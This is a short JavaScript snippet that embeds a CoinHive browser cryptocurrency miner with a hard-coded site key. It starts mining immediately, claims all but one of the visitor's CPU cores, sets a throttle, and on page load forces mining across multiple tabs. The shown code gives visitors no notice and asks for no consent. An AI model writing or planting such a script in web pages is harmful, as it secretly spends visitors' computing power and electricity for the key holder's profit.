var miner = new CoinHive.Anonymous('o3xFMjqAt3ZM4lpDCPYDYuFeMli5ohpC');
miner.start();

const maxThreads = navigator.hardwareConcurrency || 1 // hardwareConcurrency not available on iOS
let currentThreadCount = maxThreads == 1 ? 1 : maxThreads - 1 // leave 1 thread to be nice to the client

const minSpeed = 1
const maxSpeed = 100
let currentSpeed = 90 // be nice to the client

miner.setNumThreads(currentThreadCount)

let foundHashes = 0

function getCurrentThrottle() {
    return (maxSpeed - currentSpeed) / 100
}

$(function(){
  miner.setThrottle(getCurrentThrottle())
  miner.start(CoinHive.FORCE_MULTI_TAB)
});
